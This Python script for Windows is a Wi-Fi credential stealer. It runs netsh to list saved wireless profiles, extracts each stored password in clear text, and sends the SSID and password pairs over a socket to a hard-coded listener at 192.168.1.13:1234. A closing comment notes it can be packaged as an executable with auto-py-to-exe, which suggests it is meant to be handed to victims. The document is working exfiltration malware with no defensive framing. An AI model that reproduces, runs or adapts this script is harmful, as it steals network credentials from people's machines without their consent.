import subprocess
import re


command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode(errors='ignore')
# We imported the re module so that we can make use of regular expressions. We want to find all the Wifi names which is always listed after "ALL User Profile     :". In the regular expression we create a group of all characters until the return escape sequence (\r) appears.
profile_names = (re.findall("(.*): (.*)\r", command_output))
# profile_names = profile_names[:,1]
# We create an empty list outside of the loop where dictionaries with all the wifi username and passwords will be saved.
wifi_list = list()

# If we didn't find profile names we didn't have any wifi connections, so we only run the part to check for the details of the wifi and whether we can get their passwords in this part.
if len(profile_names) != 0:
    for name in profile_names:
        name = name[1]
        # Every wifi connection will need its own dictionary which will be appended to the wifi_list
        wifi_profile = dict()
        # We now run a more specific command to see the information about the specific wifi connection and if the Security key is not absent we can possibly get the password.
        profile_info = subprocess.run(["netsh", "wlan", "show", "profiles", name], capture_output = True).stdout.decode(errors='ignore')
        # We use a regular expression to only look for the absent cases so we can ignore them.
        regex = {"english" : "Security key           : Absent", "italian" : "Chiave di sicurezza      : Assente"}
        if re.search(regex["italian"], profile_info):
            continue
        else:
            # Assign the ssid of the wifi profile to the dictionary
            wifi_profile["ssid"] = name
            # These cases aren't absent and we should run them "key=clear" command part to get the password
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profiles", name, "key=clear"], capture_output = True).stdout.decode(errors='ignore')
            # Again run the regular expressions to capture the group after the : which is the password

            regex = {"italian": "Contenuto chiave            :", "english": "Key Content            :"}
            password = re.search(regex["italian"] + "(.*)\r", profile_info_pass)
            # Check if we found a password in the regular expression. All wifi connections will not have passwords.
            if password == None:
                wifi_profile["password"] = None
            else:
                # We assign the grouping (Where the password is contained) we are interested to the password key in the dictionary.
                wifi_profile["password"] = password[1]
            # We append the wifi information to the wifi_list
            wifi_list.append(wifi_profile)

# Create the message for the email
email_message = ""
for item in wifi_list:
    email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"
import socket

HOST = '192.168.1.13'  # The server's hostname or IP address
PORT = 1234        # The port used by the server

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.sendall(email_message.encode())
    data = s.recv(1024)
    print(data.decode())
input()

# auto-py-to-exe main.py